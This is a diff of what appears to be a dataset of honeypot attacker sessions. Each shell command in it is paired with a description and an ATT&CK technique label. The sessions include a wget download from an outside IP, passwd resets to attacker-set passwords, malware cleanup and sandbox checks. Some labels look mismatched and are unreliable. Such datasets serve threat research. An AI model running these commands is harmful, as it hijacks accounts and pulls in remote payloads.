@@ -8104,7 +7963,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 3f0822daf3f6
 killall -9 perl	kill processes by name	Process Discovery
 rm -rf ssh1.txt	remove files or directories	Indicator Removal
 wget http://185.234.217.21/ssh1.txt	The non-interactive network downloader	Ingress Tool Transfer
@@ -8127,35 +7986,25 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 35a6a6722eba
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: a2fbc7e8d995
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 50a8d4445fc9
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
@@ -8182,18 +8031,13 @@ rm -rf /var/tmp/dota*	remove files or directories	Indicator Removal
 
 Session ID: 2507869d03f9
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 1b5468dad61d
 killall -9 perl	kill processes by name	Process Discovery
@@ -8218,7 +8062,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: ae320426411b
 killall -9 perl	kill processes by name	Process Discovery
 rm -rf ssh1.txt	remove files or directories	Indicator Removal
 wget http://185.234.217.21/ssh1.txt	The non-interactive network downloader	Ingress Tool Transfer
@@ -8241,7 +8085,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 4563c0f785b8
 killall -9 perl	kill processes by name	Process Discovery
 rm -rf ssh1.txt	remove files or directories	Indicator Removal
 wget http://185.234.217.21/ssh1.txt	The non-interactive network downloader	Ingress Tool Transfer
@@ -8264,7 +8108,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: ec6a96dcde2a
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
 echo -e "matrix\n7GyC5wmBmS6J\n7GyC5wmBmS6J"|passwd|bash	display a line of text	Masquerading
 echo "matrix\n7GyC5wmBmS6J\n7GyC5wmBmS6J\n"|passwd	display a line of text	Masquerading
@@ -8289,18 +8133,13 @@ rm -rf /var/tmp/dota*	remove files or directories	Indicator Removal
 
 Session ID: 45f3b4282cec
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 060e4f5f9c36
 killall -9 perl	kill processes by name	Process Discovery
@@ -8325,7 +8164,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: f86d60213e1c
 killall -9 perl	kill processes by name	Process Discovery
 rm -rf ssh1.txt	remove files or directories	Indicator Removal
 wget http://185.234.217.21/ssh1.txt	The non-interactive network downloader	Ingress Tool Transfer
@@ -8348,58 +8187,41 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 8bb849dc5492
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
+rm /tmp/foo	remove files or directories	Indicator Removal
 
-- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
-rm /tmp/foo
-
-
-
+Session ID: bdfe1961f1dc
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 6f8b3ac98eee
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 5d2555c04cd3
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 246820ce25d4
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
@@ -8481,35 +8303,25 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: fd2386cb06a4
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 4fa8af53596c
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 27caf3defbe4
 killall -9 perl	kill processes by name	Process Discovery
@@ -8534,7 +8346,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: c9d8b8c6daac
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
 echo -e "articon\nXnw50C8UBwwp\nXnw50C8UBwwp"|passwd|bash	display a line of text	Masquerading
 echo "articon\nXnw50C8UBwwp\nXnw50C8UBwwp\n"|passwd	display a line of text	Masquerading
@@ -8580,7 +8392,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: b878cb6ee58a
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
 echo -e "admin1\nEkdcoxhhT8vB\nEkdcoxhhT8vB"|passwd|bash	display a line of text	Masquerading
 echo "admin1\nEkdcoxhhT8vB\nEkdcoxhhT8vB\n"|passwd	display a line of text	Masquerading
@@ -8695,20 +8507,15 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: f787254ef142
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 7d900f2bfc9b
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
@@ -8758,18 +8565,13 @@ rm -rf /var/tmp/dota*	remove files or directories	Indicator Removal
 
 Session ID: b087b5a8a696
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 292b5a6482d9
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
@@ -8796,18 +8598,13 @@ rm -rf /var/tmp/dota*	remove files or directories	Indicator Removal
 
 Session ID: 4e725a5f2625
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: c8cdd0ca11e3
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
@@ -8878,7 +8675,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: f54d646dcc22
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
 echo -e "7ujMko0admin\n1ANpaTQLQwgg\n1ANpaTQLQwgg"|passwd|bash	display a line of text	Masquerading
 echo "7ujMko0admin\n1ANpaTQLQwgg\n1ANpaTQLQwgg\n"|passwd	display a line of text	Masquerading
@@ -8970,7 +8767,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 6e368dfcd9c3
 killall -9 perl	kill processes by name	Process Discovery
 rm -rf ssh1.txt	remove files or directories	Indicator Removal
 wget http://185.234.217.21/ssh1.txt	The non-interactive network downloader	Ingress Tool Transfer
@@ -8993,7 +8790,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 6e3f0ff4e28c
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
 echo -e "password\no11ZqzwDg8VT\no11ZqzwDg8VT"|passwd|bash	display a line of text	Masquerading
 echo "password\no11ZqzwDg8VT\no11ZqzwDg8VT\n"|passwd	display a line of text	Masquerading
@@ -9029,18 +8826,13 @@ echo Hi | cat -n	display a line of text	Masquerading
 
 Session ID: c97094aa144d
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: c2de31a09cd3
 killall -9 perl	kill processes by name	Process Discovery
@@ -9065,7 +8857,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 66e0d044e61f
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
 echo -e "meinsm\nr0motF55SlMu\nr0motF55SlMu"|passwd|bash	display a line of text	Masquerading
 echo "meinsm\nr0motF55SlMu\nr0motF55SlMu\n"|passwd	display a line of text	Masquerading
@@ -9090,33 +8882,23 @@ rm -rf /var/tmp/dota*	remove files or directories	Indicator Removal
 
 Session ID: 4f73b4310e03
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 5f6d58f47875
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 2ff78d7fdc2d
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
@@ -9143,33 +8925,23 @@ rm -rf /var/tmp/dota*	remove files or directories	Indicator Removal
 
 Session ID: fef09a0f8b42
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 0e36c7ffc897
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 3702533ec299
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
@@ -12140,7 +11912,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: e3ba7affffdb
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
 echo -e "654321\nfdgvP7j3S1Ni\nfdgvP7j3S1Ni"|passwd|bash	display a line of text	Masquerading
 echo "654321\nfdgvP7j3S1Ni\nfdgvP7j3S1Ni\n"|passwd	display a line of text	Masquerading
@@ -12257,18 +12029,13 @@ rm -rf /var/tmp/dota*	remove files or directories	Indicator Removal
 
 Session ID: f30d2676a86c
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 1d6f7ee021cd
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
@@ -13121,7 +12888,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: eb09f66919c9
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
 echo -e "P@ssw0rd!\nuxYnXRrwRt1h\nuxYnXRrwRt1h"|passwd|bash	display a line of text	Masquerading
 echo "P@ssw0rd!\nuxYnXRrwRt1h\nuxYnXRrwRt1h\n"|passwd	display a line of text	Masquerading
@@ -13215,18 +12982,13 @@ rm -rf /var/tmp/dota*	remove files or directories	Indicator Removal
 
 Session ID: 96c0aa3d3f4c
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: f299564613e8
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
@@ -14000,18 +13762,13 @@ rm -rf /var/tmp/dota*	remove files or directories	Indicator Removal
 
 Session ID: 7ad7f406d96f
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 3339fc298af0
 killall -9 perl	kill processes by name	Process Discovery
@@ -14036,7 +13793,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: cdd6fd484fc0
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
 echo -e "p@55w0rd\n928qZ0HPjvTo\n928qZ0HPjvTo"|passwd|bash	display a line of text	Masquerading
 echo "p@55w0rd\n928qZ0HPjvTo\n928qZ0HPjvTo\n"|passwd	display a line of text	Masquerading
@@ -14949,7 +14706,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: aaf32ef43990
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
 echo -e "password\nM6f2ywpzt7i2\nM6f2ywpzt7i2"|passwd|bash	display a line of text	Masquerading
 echo "password\nM6f2ywpzt7i2\nM6f2ywpzt7i2\n"|passwd	display a line of text	Masquerading
@@ -15112,18 +14869,13 @@ rm -rf /var/tmp/dota*	remove files or directories	Indicator Removal
 
 Session ID: 98a0593205cf
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: bd21c465b976
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
@@ -17434,7 +17186,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: e8d511f86841
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
 echo -e "nimda\nxqHiTFsGNDd8\nxqHiTFsGNDd8"|passwd|bash	display a line of text	Masquerading
 echo "nimda\nxqHiTFsGNDd8\nxqHiTFsGNDd8\n"|passwd	display a line of text	Masquerading
@@ -17482,18 +17234,13 @@ rm -rf /var/tmp/dota*	remove files or directories	Indicator Removal
 
 Session ID: 8fcebedfad53
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: fd90369164bd
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
@@ -23399,9 +23146,7 @@ rm	remove files or directories	Indicator Removal
 - Mapping:		System Information Discovery
 
 Session ID: d324cf6e4da1
-
-
-ip
+ip	show / manipulate routing, network devices, interfaces and tunnels	System Network Configuration Discovery
 uname	print system information	System Information Discovery
 cat	concatenate files and print on the standard output	Automated Collection
 proc	process information pseudo-filesystem	File and Directory Discovery
@@ -23415,8 +23160,8 @@ config	OpenSSL CONF library configuration files	Obfuscated Files or Information
 echo	display a line of text	Masquerading
 cat	concatenate files and print on the standard output	Automated Collection
 
-- Mapping:		System Information Discovery
-- Mapping:		File and Directory Discovery
+- Mapping:		System Network Configuration Discovery
+- Mapping:		System Network Connections Discovery
 
 Session ID: 56e2dfa7d5eb
 cat	concatenate files and print on the standard output	Automated Collection
@@ -24891,9 +24636,7 @@ rm	remove files or directories	Indicator Removal
 - Mapping:		System Information Discovery
 
 Session ID: a857d70281bb
-
-
-ip
+ip	show / manipulate routing, network devices, interfaces and tunnels	System Network Configuration Discovery
 uname	print system information	System Information Discovery
 cat	concatenate files and print on the standard output	Automated Collection
 proc	process information pseudo-filesystem	File and Directory Discovery
@@ -24907,8 +24650,8 @@ config	OpenSSL CONF library configuration files	Obfuscated Files or Information
 echo	display a line of text	Masquerading
 cat	concatenate files and print on the standard output	Automated Collection
 
-- Mapping:		System Information Discovery
-- Mapping:		File and Directory Discovery
+- Mapping:		System Network Configuration Discovery
+- Mapping:		System Network Connections Discovery
 
 Session ID: 55b92acd8fb6
 cat	concatenate files and print on the standard output	Automated Collection
@@ -26071,9 +25814,7 @@ rm	remove files or directories	Indicator Removal
 - Mapping:		System Information Discovery
 
 Session ID: ca668bdc003b
-
-
-ip
+ip	show / manipulate routing, network devices, interfaces and tunnels	System Network Configuration Discovery
 uname	print system information	System Information Discovery
 cat	concatenate files and print on the standard output	Automated Collection
 proc	process information pseudo-filesystem	File and Directory Discovery
@@ -26087,8 +25828,8 @@ config	OpenSSL CONF library configuration files	Obfuscated Files or Information
 echo	display a line of text	Masquerading
 cat	concatenate files and print on the standard output	Automated Collection
 
-- Mapping:		System Information Discovery
-- Mapping:		File and Directory Discovery
+- Mapping:		System Network Configuration Discovery
+- Mapping:		System Network Connections Discovery
 
 Session ID: 1c2f031038cc
 cat	concatenate files and print on the standard output	Automated Collection
@@ -31045,7 +30786,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 60c99c71fadc
 cat	concatenate files and print on the standard output	Automated Collection
 proc	process information pseudo-filesystem	File and Directory Discovery
 grep	print lines that match patterns	Automated Collection
@@ -31165,7 +30906,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 179a56ded9d0
 cat	concatenate files and print on the standard output	Automated Collection
 proc	process information pseudo-filesystem	File and Directory Discovery
 grep	print lines that match patterns	Automated Collection
@@ -31259,19 +31000,14 @@ rm	remove files or directories	Indicator Removal
 
 Session ID: e13e1b77e53e
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 63a9eb6fe55f
 killall	kill processes by name	Process Discovery
@@ -31301,7 +31037,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 19ffa193271f
 cat	concatenate files and print on the standard output	Automated Collection
 proc	process information pseudo-filesystem	File and Directory Discovery
 grep	print lines that match patterns	Automated Collection
@@ -31421,7 +31157,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 040c2b470a04
 cat	concatenate files and print on the standard output	Automated Collection
 proc	process information pseudo-filesystem	File and Directory Discovery
 grep	print lines that match patterns	Automated Collection
@@ -31561,19 +31297,14 @@ rm	remove files or directories	Indicator Removal
 
 Session ID: 9caf34b6628a
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 5384b641e9de
 cat	concatenate files and print on the standard output	Automated Collection
@@ -31695,21 +31426,16 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 974cfff7c03e
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: b006a85b6a0f
 killall	kill processes by name	Process Discovery
@@ -31739,7 +31465,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: be08fe5d8c3c
 cat	concatenate files and print on the standard output	Automated Collection
 proc	process information pseudo-filesystem	File and Directory Discovery
 grep	print lines that match patterns	Automated Collection
@@ -31813,21 +31539,16 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: bc9c94f921a8
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: c33ef32e510d
 killall	kill processes by name	Process Discovery
@@ -31857,7 +31578,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 579c263b09d8
 killall	kill processes by name	Process Discovery
 perl	The Perl 5 language interpreter	Command and Scripting Interpreter
 rm	remove files or directories	Indicator Removal
@@ -31885,7 +31606,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: e53f01b8a302
 killall	kill processes by name	Process Discovery
 perl	The Perl 5 language interpreter	Command and Scripting Interpreter
